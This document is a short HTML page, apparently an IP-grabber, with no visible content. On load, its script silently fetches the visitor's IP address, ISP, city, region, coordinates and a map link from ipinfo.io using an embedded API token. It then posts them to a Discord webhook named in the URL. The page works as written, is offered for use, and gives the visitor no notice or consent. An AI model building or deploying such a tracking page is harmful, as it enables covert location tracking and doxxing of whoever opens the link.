<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send IP and Geolocation to Discord</title>
</head>
<body>
    <script>
        // Function to extract the 'webhook' parameter from the URL
        function getWebhookFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('webhook'); // Extract the webhook URL from the query string
        }

        // Function to fetch visitor information and send to Discord webhook
        async function sendVisitorInfoToWebhook() {
            try {
                // Fetch the user's geolocation information from ipinfo.io
                const response = await fetch('https://ipinfo.io/json?token=75df35b1472407');
                const visitorInfo = await response.json();

                // Get the webhook URL from the query string
                const webhookUrl = getWebhookFromUrl();

                // Create the Discord embed payload
                const embed = {
                    title: "Visitor's IP and Geolocation Information",
                    color: 0x000000,
                    fields: [
                        { name: "IP", value: visitorInfo.ip, inline: true },
                        { name: "ISP", value: visitorInfo.org, inline: true },
                        { name: "ASN", value: visitorInfo.asn, inline: true },
                        { name: "Country", value: `${visitorInfo.country} (${visitorInfo.countryCode})`, inline: true },
                        { name: "Region", value: `${visitorInfo.region} (${visitorInfo.regionCode})`, inline: true },
                        { name: "City", value: visitorInfo.city, inline: true },
                        { name: "Time Zone", value: visitorInfo.timezone, inline: true },
                        { name: "Latitude & Longitude", value: `${visitorInfo.loc.split(',')[0]}, ${visitorInfo.loc.split(',')[1]}`, inline: true },
                        { name: "Accuracy Radius", value: `${visitorInfo.accuracyRadius} KM`, inline: true },
                        { name: "Geolocation Map", value: `[Activate](https://www.google.com/maps?q=${visitorInfo.loc.split(',')[0]},${visitorInfo.loc.split(',')[1]})`, inline: false },
                        { name: "Last Data Update", value: visitorInfo.time, inline: false },
                    ]
                };

                // Send the data to Discord webhook
                if (webhookUrl) {
                    const webhookResponse = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ embeds: [embed] }),
                    });

                    if (webhookResponse.ok) {
                        console.log('Visitor info sent successfully!');
                    } else {
                        console.error('Failed to send data to Discord webhook:', webhookResponse.statusText);
                    }
                } else {
                    console.error('No webhook URL provided!');
                }
            } catch (error) {
                console.error('Unexpected error:', error.message);
            }
        }

        // Run the function when the page loads
        sendVisitorInfoToWebhook();
    </script>
</body>
</html>
